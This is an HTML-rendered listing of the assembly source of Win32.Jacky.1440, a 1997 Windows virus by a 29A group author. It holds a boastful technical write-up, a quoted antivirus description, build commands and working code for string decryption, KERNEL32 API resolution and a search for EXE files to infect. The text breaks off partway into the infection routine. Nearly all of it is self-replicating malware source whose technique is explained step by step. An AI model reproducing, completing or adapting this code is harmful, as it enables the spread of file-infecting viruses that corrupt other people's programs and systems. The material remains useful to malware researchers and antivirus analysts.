<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Jacky.1440 - w32jacky.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                  ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹</span><span class="sc0">
</span><span class="sc1">;          Win32.Jacky.1440                        €€€ €€€ €€€ €€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;          by Jacky Qwerty/29A                      ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€</span><span class="sc0">
</span><span class="sc1">;                                                  €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;                                                  €€€€€€€ €€€€€€ﬂ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hello ppl, welcome  to the first "Winblowz" 95/NT  fully compatible virus.</span><span class="sc0">
</span><span class="sc1">; Yea i didnt mistype above, it reads  "Win32" not "Win95" coz  this babe is</span><span class="sc0">
</span><span class="sc1">; really  a "genuine" Win32 virus, which  means it should  be able to infect</span><span class="sc0">
</span><span class="sc1">; any Win32 based system:  Windoze 95, Windoze NT or Win32s.  For some known</span><span class="sc0">
</span><span class="sc1">; reasonz that i wont delve in detail here, previous Win95 virusez were una-</span><span class="sc0">
</span><span class="sc1">; ble to spread succesfully under NT.  The main reasonz were becoz they asu-</span><span class="sc0">
</span><span class="sc1">; med KERNEL32 bein  loaded at a fixed  base adress (not true for NT or even</span><span class="sc0">
</span><span class="sc1">; future  Win95 updatez)  and they also made a "guess" about where the Win32</span><span class="sc0">
</span><span class="sc1">; API functionz were located inside the KERNEL32 itself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus does NOT rely on fixed memory positionz or absolute adressez in</span><span class="sc0">
</span><span class="sc1">; order to run and spread. It always works at the Win32 API level, not play-</span><span class="sc0">
</span><span class="sc1">; in its trickz "under the hood". This proves enough for the virus to spread</span><span class="sc0">
</span><span class="sc1">; succesfully on NT, asumin the user has enough rightz, of course.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Unfortunately, this virus didnt  make it as the first Windoze NT virus for</span><span class="sc0">
</span><span class="sc1">; the media.  AVerz said they  didnt have an NT machine  available for virus</span><span class="sc0">
</span><span class="sc1">; testin, so they simply didnt test it under NT.  Well ehem, thats what they</span><span class="sc0">
</span><span class="sc1">; said #8S. In the past summer however i finished the codin of Win32.Cabanas</span><span class="sc0">
</span><span class="sc1">; which is a far superior virus with much more featurez than its predecesor.</span><span class="sc0">
</span><span class="sc1">; This time, the guyz from Datafellowz and AVP made serious testz with Caba-</span><span class="sc0">
</span><span class="sc1">; nas under NT until they finally concluded: "Oh miracle! it is able to work</span><span class="sc0">
</span><span class="sc1">; under NT!".  So acordin to the media, Win32.Cabanas is the first WinNT vi-</span><span class="sc0">
</span><span class="sc1">; rus and not Win32.Jacky as it should have been. Anywayz..</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Technical description</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; When Win32.Jacky executes,  it first looks  for KERNEL32  base adress usin</span><span class="sc0">
</span><span class="sc1">; the GetModuleHandleA API right from the host  import table and then it re-</span><span class="sc0">
</span><span class="sc1">; trieves all other file API function adressez by usin the GetProcAdress API</span><span class="sc0">
</span><span class="sc1">; also from the import table.  These APIz are not inserted by the virus when</span><span class="sc0">
</span><span class="sc1">; infection, they are only used if they already existed there (very likely),</span><span class="sc0">
</span><span class="sc1">; but this is not a "must do" for the virus to work tho. After all Win32 API</span><span class="sc0">
</span><span class="sc1">; functionz needed by the virus have been located, it looks for PE (EXE) fi-</span><span class="sc0">
</span><span class="sc1">; lez in the current directory and infects them one by one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When infection starts,  each EXE file is opened and maped in shared memory</span><span class="sc0">
</span><span class="sc1">; usin the  "file mapin" API functionz provided by KERNEL32.  This proves to</span><span class="sc0">
</span><span class="sc1">; be a great advance  regardin  file functionz as it clearly simplifies to a</span><span class="sc0">
</span><span class="sc1">; large extent the infection process and file handlin in general.  After the</span><span class="sc0">
</span><span class="sc1">; PE signature is detected from  the maped file,  the virus inspects its im-</span><span class="sc0">
</span><span class="sc1">; port table lookin  for the GetModuleHandleA and GetProcAddress APIz inside</span><span class="sc0">
</span><span class="sc1">; the KERNEL32  import descriptor.  If this module is not imported, the file</span><span class="sc0">
</span><span class="sc1">; is left  alone and discarded.  If the GetProcAddress API is not found, the</span><span class="sc0">
</span><span class="sc1">; virus  (later on  when it executes)  will call its own internal GetProcAd-</span><span class="sc0">
</span><span class="sc1">; dressET function,  which simply inspects  the KERNEL32 export table lookin</span><span class="sc0">
</span><span class="sc1">; for any specified Win32 API function. If GetModuleHandleA is not found the</span><span class="sc0">
</span><span class="sc1">; file will still get infected but then the virus, in order to find the KER-</span><span class="sc0">
</span><span class="sc1">; NEL32 base adress, will be relyin on a smoewhat undocumented feature (che-</span><span class="sc0">
</span><span class="sc1">; cked before use). This feature is very simple: whenever a PE file with un-</span><span class="sc0">
</span><span class="sc1">; bound KERNEL32 function adressez is loaded, the Win95 loader puts the KER-</span><span class="sc0">
</span><span class="sc1">; NEL32 adress in  the  ForwarderChain field of the KERNEL32 import descrip-</span><span class="sc0">
</span><span class="sc1">; tor. This also works in Win95 OSR2 version but  doesnt  work on WinNT tho,</span><span class="sc0">
</span><span class="sc1">; so it should be used with some care after makin some sanity checkz first.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If the GetModuleHandleA and GetProcAddrss  APIz are found,  the virus will</span><span class="sc0">
</span><span class="sc1">; hardcode  their IAT referencez  inside the virus code,  then later on when</span><span class="sc0">
</span><span class="sc1">; the virus executes, it will have these API referencez already waitin to be</span><span class="sc0">
</span><span class="sc1">; called by the installation code. After the latter  API search is done, the</span><span class="sc0">
</span><span class="sc1">; virus copies itself to the last section in the file,  modifies the section</span><span class="sc0">
</span><span class="sc1">; atributez to acomodate the virus code  and finally  changes the EntryPoint</span><span class="sc0">
</span><span class="sc1">; field in the PE header to point to the virus code. The virus doesnt change</span><span class="sc0">
</span><span class="sc1">; or modify  the time/date stamp  of infected filez  nor it is stoped by the</span><span class="sc0">
</span><span class="sc1">; "read only" atribute.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AVP description</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; Before jumpin to the  source code, lets read what AVP has to say about the</span><span class="sc0">
</span><span class="sc1">; virus. Unfortunately as u will see they didnt test the thing on NT, other-</span><span class="sc0">
</span><span class="sc1">; wise they would have had a big surprise with it hehe #8D</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (*) Win95.Jacky - http://www.avp.ch/avpve/newexe/win95/jacky.stm *</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&gt;8</span><span class="sc0">
</span><span class="sc1">; It is a harmless nonmemory resident parasitic Win95/NT virus 1440</span><span class="sc0">
</span><span class="sc1">; bytes of length. Being executed the virus scans Win95/NT kernel and</span><span class="sc0">
</span><span class="sc1">; gets undocumented addresses of system file access function (see the</span><span class="sc0">
</span><span class="sc1">; list below).  Then it searches for NewEXE Portable Executable</span><span class="sc0">
</span><span class="sc1">; (Win95 and NT) files and writes itself to the end of the file. The</span><span class="sc0">
</span><span class="sc1">; virus aligns the file length to the section, so the file lengths</span><span class="sc0">
</span><span class="sc1">; grows more that 1440 bytes while infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is the first known Win95/NT parasitic virus that does not add</span><span class="sc0">
</span><span class="sc1">; new section to the file - while infecting a file the virus writes</span><span class="sc0">
</span><span class="sc1">; itself to the end of the file, increases the size of last section</span><span class="sc0">
</span><span class="sc1">; in the file, and modifies characteristics of this section.  So,</span><span class="sc0">
</span><span class="sc1">; only entry point address, size and characteristics of last section</span><span class="sc0">
</span><span class="sc1">; are modified in infected files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is also first known to me Win95/NT infector that did work on</span><span class="sc0">
</span><span class="sc1">; my test computer (Windows95) without any problem. I did not try it</span><span class="sc0">
</span><span class="sc1">; under NT.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus contains the encrypted strings, a part of these strings</span><span class="sc0">
</span><span class="sc1">; are the names of system functions that are used during infection:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   KERNEL32 GetModuleHandleA GetProcAddress</span><span class="sc0">
</span><span class="sc1">;   *.EXE</span><span class="sc0">
</span><span class="sc1">;   CreateFileA CreateFileMappingA CloseHandle UnmapViewOfFile</span><span class="sc0">
</span><span class="sc1">;   MapViewOfFile FindFirstFileA FindNextFileA FindClose</span><span class="sc0">
</span><span class="sc1">;   SetFileAttributesA SetFilePointer SetEndOfFile SetFileTime</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   To My d34d fRi3nD c4b4n4s..</span><span class="sc0">
</span><span class="sc1">;   A Win/NT/95 ViRuS v1.00.</span><span class="sc0">
</span><span class="sc1">;   By: j4cKy Qw3rTy / 29A.</span><span class="sc0">
</span><span class="sc1">;   jqw3rty@cryogen.com</span><span class="sc0">
</span><span class="sc1">;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetingz</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; And finaly the greetinz go to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Mr.Chan, Wai ......... Thx for your help and advice.. master!</span><span class="sc0">
</span><span class="sc1">;   MrSandman/29A ........ erm.. when will 29A#2 go out? hehe ;)</span><span class="sc0">
</span><span class="sc1">;   QuantumG ............. What about yer NT resident driver idea?</span><span class="sc0">
</span><span class="sc1">;   DarkSide1 ............ We are Southamerican rockerzzz!</span><span class="sc0">
</span><span class="sc1">;   GriYo/29A ............ Implant poly rulez!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Disclaimer</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; This source code is for educational purposez only.  The author is not res-</span><span class="sc0">
</span><span class="sc1">; ponsible for any problemz caused due to the assembly of this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling it</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; tasm32 -ml -m5 -q -zn w32jacky.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -c -x -aa w32jacky,,, import32</span><span class="sc0">
</span><span class="sc1">; pewrsec w32jacky.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1997 Jacky Qwerty/29A.</span><span class="sc0">


</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">    </span><span class="sc1">;whoaa.. no more segmentz</span><span class="sc0">

</span><span class="sc1">;Some includez containin very useful structurez and constantz for Win32</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32API.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE.inc</span><span class="sc0">

</span><span class="sc1">;Some equ's needed by the virus</span><span class="sc0">

</span><span class="sc5">work_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">           </span><span class="sc1">;size to grow up memory maped file</span><span class="sc0">
</span><span class="sc5">size_pad</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">             </span><span class="sc1">;size paddin to mark infected filez</span><span class="sc0">
</span><span class="sc5">v_size</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0"> </span><span class="sc1">;virus absolute size in filez</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc1">;APIs used durin first generation only</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetProcAddress</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;some dummy data so tlink32 dont yell</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;Virus code starts here</span><span class="sc0">

</span><span class="sc5">v_start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;make space to store return adress</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_deltaz</span><span class="sc0">      </span><span class="sc1">;here we go</span><span class="sc0">

</span><span class="sc1">;API namez needed by the virus. They will travel in encrypted form</span><span class="sc0">

</span><span class="sc5">ve_stringz</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">veszKernel32</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetModuleHandleA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszGetProcAddress</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">eEXE_filez</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;filez to search</span><span class="sc0">

</span><span class="sc5">veszCreateFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszCreateFileMappingA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszCloseHandle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszUnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszMapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszFindFirstFileA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszFindNextFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszFindClose</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetFileAttributesA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetFilePointer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetEndOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">veszSetFileTime</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">eEndOfFunctionNames</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;An epitaph to a good friend of mine (not a "junkie" Pete)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'To My d34d fRi3nD c4b4n4s..'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A Win/NT/95 ViRuS v1.00. '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'By: j4cKy Qw3rTy / 29A. '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0"> 
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'jqw3rty@cryogen.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ve_string_size</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc0">

</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;decrypt API stringz</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_deltaz</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ve_string_size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                              </span><span class="sc1">;get pointer to ve_stringz</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get pointer to virus end</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                    </span><span class="sc1">;save pointer to virus start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">delta_host</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                    </span><span class="sc1">;save current host base adress</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_stringz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get pointer to API namez</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">phost_start_rva</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;push pointer to "KERNEL32" string</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.RetAddr</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;save host entry to return</span><span class="sc0">

</span><span class="sc5">decrypt_stringz</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">                      </span><span class="sc1">;decrypt encrypted API and stringz</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetModuleHandleA</span><span class="sc0">         </span><span class="sc1">;get KERNEL32 base adress</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">jmp_host_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;save it</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionAddressez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">GetAPIAddress</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;get adressez of API functionz used by the virus</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyGetProcAddressK32</span><span class="sc0">     </span><span class="sc1">;get API adress</span><span class="sc0">

</span><span class="sc5">jmp_host_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">jmp_host</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;save retrieved API adress</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;point to next API name</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;end of API namez reached?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetAPIAddress</span><span class="sc0">           </span><span class="sc1">;no, get next API adress</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Find filez matchin *.EXE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EXE_filez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;call FindFirstFileA API</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">jmp_host</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;save search handle</span><span class="sc0">

</span><span class="sc5">Process_File</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;check file and infect it</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">                    </span><span class="sc1">;open and map file</span><span class="sc0">
